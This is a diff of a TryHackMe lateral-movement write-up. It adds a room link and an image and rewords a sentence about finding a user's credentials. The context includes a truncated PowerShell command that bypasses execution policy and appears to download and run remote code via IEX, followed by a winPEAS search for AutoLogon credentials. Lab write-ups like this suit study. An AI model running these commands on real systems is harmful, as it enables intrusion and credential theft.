@@ -4,9 +4,13 @@ date: "2026-09-20"
 platform: "TryHackMe"
 difficulty: "Medium"
 ---
-![](../Attachments/Pasted%20image%2020260920202342.png)
+# Room link: https://tryhackme.com/room/windowsjump
+
+![](../Attachments/Pasted%20image%2020260923031220.png)
 
 This is the flow of lateral movement.
+
+![](../Attachments/Pasted%20image%2020260920202342.png)
 
 ```bash
 PORT      STATE SERVICE       VERSION
@@ -184,7 +188,7 @@ PS C:\Users\thmuser\Desktop> powershell -ExecutionPolicy Bypass -Command "IEX(Ne
 [*] Winpeas running (PID: 4312)...
 ```
 
-Whilst scrubbing the `winpeas` output. It managed to find `notadmin's credentials`.
+Whilst scrubbing the `winpeas` output. I found `notadmin's credentials`.
 
 ```powershell
 Looking for AutoLogon credentials (T1552.002)
